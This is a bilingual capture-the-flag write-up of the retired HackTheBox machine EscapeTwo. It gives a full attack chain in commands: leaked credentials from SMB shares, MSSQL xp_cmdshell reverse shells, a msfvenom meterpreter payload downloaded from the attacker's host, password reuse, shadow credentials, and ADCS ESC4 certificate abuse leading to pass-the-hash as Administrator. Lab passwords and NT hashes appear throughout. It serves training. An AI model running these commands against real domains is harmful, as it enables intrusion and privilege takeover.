# EscapeTwo [Easy]

> **ES:** Controlador de dominio Windows (assume-breach con `rose`); de MSSQL `sa` a `sql_svc` y de ADCS ESC4 a Administrador del dominio.
> **EN:** Windows domain controller (assume-breach as `rose`); from MSSQL `sa` to `sql_svc` and via ADCS ESC4 to Domain Admin.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Windows |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/EscapeTwo] |
| **URL** | https://app.hackthebox.com/machines/EscapeTwo |
| **IP lab** | 10.10.11.51 |
| **Fecha de resolución** | 2026-09-24 |

---

## Fuentes / Sources

- [IppSec: EscapeTwo (video)](https://youtube.com/watch?v=fE6BYs4P1t4) - IppSec - fecha de acceso: 2026-09-24.

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía credenciales iniciales `rose` → Excel con creds MSSQL `sa` → shell `sql_svc` → `ryan` (config SQL) → shadow creds + ADCS ESC4 → `Administrator`.
> **EN:** Get `user.txt` and `root.txt` via starter creds `rose` → Excel with MSSQL `sa` creds → `sql_svc` shell → `ryan` (SQL config) → shadow creds + ADCS ESC4 → `Administrator`.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] netexec / crackmapexec (smb/ldap/mssql)
- [ ] smbclient / smbmap
- [ ] mssqlclient.py / xp_cmdshell (Impacket)
- [ ] evil-winrm
- [ ] bloodhound-python
- [ ] bloodyAD + dacledit.py + certipy-ad (shadow/find/template/req/auth)

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Es DC (`sequel.htb`/`DC01`, Windows Server 2019): DNS, Kerberos, LDAP/LDAPS, SMB (firma requerida), MSSQL 2019 (1433), WinRM 5985. Se parte con credenciales iniciales `rose : KxEPkKe6R8su` (assume-breach, credencial de laboratorio retirado).
> **EN:** It is a DC (`sequel.htb`/`DC01`, Windows Server 2019): DNS, Kerberos, LDAP/LDAPS, SMB (signing required), MSSQL 2019 (1433), WinRM 5985. Start with starter creds `rose : KxEPkKe6R8su` (assume-breach, retired-lab credential).

```bash
nmap -sC -sV -p- -oN nmap_init 10.10.11.51
echo '10.10.11.51 sequel.htb DC01.sequel.htb' | sudo tee -a /etc/hosts
nxc smb sequel.htb -u rose -p 'KxEPkKe6R8su' --users
crackmapexec smb sequel.htb -u rose -p 'KxEPkKe6R8su' --rid-brute
```

**Resultado / Result:** Dominio `sequel.htb`, host `DC01`, MSSQL 1433 (SQL Server 2019 RTM, `DC01\SQLEXPRESS`). RID-brute confirma usuarios `michael`, `ryan`, `oscar`, `sql_svc`, `ca_svc`, `rose` y grupos `Management/Sales/Accounting Department`. Captura BloodHound en `images/`; apoyo en `img/`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** Con `rose` se enumeran shares SMB (`Accounting Department` y `Users` legibles); del share se descargan `accounting_2024.xlsx` y `accounts.xlsx` (hubo que reparar bloques corruptos). El `accounts.xlsx` (o su `xl/sharedStrings.xml` tras `unzip`) expone tabla de usuarios y la cuenta `sa` de MSSQL. `sa` exige `--local-auth` en netexec.
> **EN:** With `rose` enumerate SMB shares (`Accounting Department` and `Users` readable); download `accounting_2024.xlsx` and `accounts.xlsx` from the share (corrupt blocks had to be repaired). `accounts.xlsx` (or its `xl/sharedStrings.xml` after `unzip`) leaks a user table and the MSSQL `sa` account. `sa` requires `--local-auth` in netexec.

```bash
smbclient -L 10.10.11.51 -U rose
smbmap -H 10.10.11.51 -u rose -p 'KxEPkKe6R8su'
smbclient //10.10.11.51/"Accounting Department" -U rose
# smb: \> get accounts.xlsx  (+ accounting_2024.xlsx; reparar si hay error de bloques)
unzip accounts.xlsx -d accounts_extracted && cat accounts_extracted/xl/sharedStrings.xml
# angela:0fwz7Q4mSpurIt99 | oscar:86LxLBMgEWaKUnBG | kevin:Md9Wlq1E5bZnVDVo | sa:MSSQLP@ssw0rd!
nxc mssql sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth
# [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
```

**Resultado / Result:** Credencial `sa : MSSQLP@ssw0rd!` válida (Pwn3d) con `--local-auth` (sin él falla: "untrusted domain"). Captura del xlsx reparado en `img/image_20250443-094346.png`.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Ejecución vía MSSQL (`mssqlclient.py` con `enable_xp_cmdshell`/`xp_cmdshell`, o netexec `-x`) con PowerShell (Nishang `Invoke-PowerShellTcp` o `powershell -e <base64>`); shell como `SEQUEL\sql_svc`. Luego se estabiliza con meterpreter (`msfvenom` + `Invoke-WebRequest` a `C:\Users\Public\Downloads\exp.exe`).
> **EN:** Code exec via MSSQL (`mssqlclient.py` with `enable_xp_cmdshell`/`xp_cmdshell`, or netexec `-x`) with PowerShell (Nishang `Invoke-PowerShellTcp` or `powershell -e <base64>`); shell as `SEQUEL\sql_svc`. Then stabilize with meterpreter (`msfvenom` + `Invoke-WebRequest` to `C:\Users\Public\Downloads\exp.exe`).

```bash
mssqlclient.py -p 1433 sa@sequel.htb -dc-ip 10.10.11.51
# SQL> enable_xp_cmdshell
# SQL> xp_cmdshell powershell -NoProfile -ExecutionPolicy Bypass -Command "& {IEX(...Invoke-PowerShellTcp.ps1...)}"
# --- alternativa netexec ---
nc -lvnp 9999
nxc mssql sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x 'powershell -e <base64-revshell>'
# en el target como sql_svc:
whoami  # sequel\sql_svc
# --- persistencia/estabilización ---
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TU-IP> LPORT=9111 -f exe -o exp.exe
# en target: Invoke-WebRequest -Uri http://<TU-IP>/exp.exe -OutFile C:\Users\Public\Downloads\exp.exe
```

**Resultado / Result:** Shell como `sql_svc` en el DC (meterpreter: `DC01`, Windows Server 2019 x64, `SEQUEL\sql_svc`).

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Desde `sql_svc` se lee `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI`: `SQLSVCPASSWORD=WqSZAF6CysDQbGb3` (es la clave de `ryan`) y `SAPWD=MSSQLP@ssw0rd!`. Con `ryan:WqSZAF6CysDQbGb3` se entra por WinRM (`Remote Management Users`) y su escritorio tiene `user.txt`. BloodHound (`bloodhound-python -c All -u ryan …`) orienta el siguiente salto: `ryan` está en `Management Department` y `ca_svc` es cuenta de CA.
> **EN:** From `sql_svc` read `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI`: `SQLSVCPASSWORD=WqSZAF6CysDQbGb3` (it is `ryan`'s password) and `SAPWD=MSSQLP@ssw0rd!`. With `ryan:WqSZAF6CysDQbGb3` enter via WinRM (`Remote Management Users`); his desktop holds `user.txt`. BloodHound (`bloodhound-python -c All -u ryan …`) guides the next hop: `ryan` is in `Management Department` and `ca_svc` is a CA account.

```bash
cat C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
# SQLSVCACCOUNT="SEQUEL\sql_svc" / SQLSVCPASSWORD="WqSZAF6CysDQbGb3" / SAPWD="MSSQLP@ssw0rd!"
evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
# *Evil-WinRM* PS C:\Users\ryan\Documents> type ..\Desktop\user.txt  # formato: 34cd... (ofuscado)
net user /domain  # Administrator, ca_svc, michael, oscar, rose, ryan, sql_svc...
bloodhound-python -c All -u ryan -p 'WqSZAF6CysDQbGb3' -ns 10.10.11.51 -d sequel.htb --zip
```

**Resultado / Result:** Sesión `SEQUEL\ryan` por WinRM → `user.txt` (flag no reproducida).

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `ryan` (Management Department) toma propiedad de `ca_svc` (bloodyAD `set owner` + `dacledit` FullControl), genera shadow credentials (`certipy-ad shadow auto`) y obtiene su NT hash (`3b181b914e7a9d5508ea1e20bc2b7fce`, hash de laboratorio retirado). `certipy find -vulnerable` marca ESC4 en la plantilla `DunderMifflinAuthentication` (Cert Publishers con permisos peligrosos): se reescribe la plantilla (`certipy template`), se pide cert con UPN `Administrator` (`certipy req`, CA `sequel-DC01-CA`), se autentica (`certipy auth` → NT de Administrator `7a8d4e04986afa8ed4060f75e5a0b3ff`) y se entra con evil-winrm por hash.
> **EN:** `ryan` (Management Department) takes ownership of `ca_svc` (bloodyAD `set owner` + `dacledit` FullControl), creates shadow credentials (`certipy-ad shadow auto`) and gets its NT hash (`3b181b914e7a9d5508ea1e20bc2b7fce`, retired-lab hash). `certipy find -vulnerable` flags ESC4 on template `DunderMifflinAuthentication` (Cert Publishers with dangerous rights): rewrite the template (`certipy template`), request a cert with UPN `Administrator` (`certipy req`, CA `sequel-DC01-CA`), auth (`certipy auth` → Administrator NT `7a8d4e04986afa8ed4060f75e5a0b3ff`) and login with evil-winrm pass-the-hash.

```bash
bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan
dacledit.py -action write -rights FullControl -principal ryan -target ca_svc 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
certipy-ad shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -ns 10.10.11.51 -target dc01.sequel.htb -account ca_svc
# -> NT de ca_svc: 3b181b914e7a9d5508ea1e20bc2b7fce (laboratorio retirado)
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -target dc01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout
# ESC4: DunderMifflinAuthentication
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.10.11.51
certipy-ad req -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51
# -> administrator_10.pfx
certipy-ad auth -pfx ./administrator_10.pfx -dc-ip 10.10.11.51  # elegir [0] UPN Administrator
# -> NT Administrator: 7a8d4e04986afa8ed4060f75e5a0b3ff (laboratorio retirado)
evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
# *Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt  # formato: c12d... (ofuscado)
```

**Resultado / Result:** Certificado de Domain Admin → hash NT de `Administrator` → WinRM. Técnica: ADCS ESC4. Captura de apoyo en `img/image_20250445-134538.png`.

---

## 🧠 Lo aprendido / Learned

> **ES:** Escenario assume-breach; Excel con secretos; MSSQL como foothold en DC; ADCS ESC4 (plantillas con ACL débiles) hasta Domain Admin.
> **EN:** Assume-breach scenario; secrets in Excel; MSSQL as DC foothold; ADCS ESC4 (weak template ACLs) to Domain Admin.

- [ ] `xp_cmdshell` / netexec `-x` para RCE vía MSSQL
- [ ] Config SQL (`sql-Configuration.INI`) como fuente de reuse (`ryan`)
- [ ] bloodyAD + dacledit + certipy `shadow` para controlar `ca_svc`
- [ ] certipy `find`, `template`, `req`, `auth` (ESC4)
- [ ] Mitigar ESC4 endureciendo ACLs de plantillas

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: smbclient/smbmap, `sharedStrings.xml`, sesión `mssqlclient.py`, `sql-Configuration.INI`, cadena certipy completa) — wither/nota migrada
- **Walkthrough de referencia:** HTB EscapeTwo — https://0xdf.gitlab.io/2025/05/24/htb-escapetwo.html — 0xdf
- **Referencia técnica:** ESC4 - Access Control Vulnerabilities — https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/#esc4-access-control-vulnerabilities — Swisskyrepo (InternalAllTheThings)
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
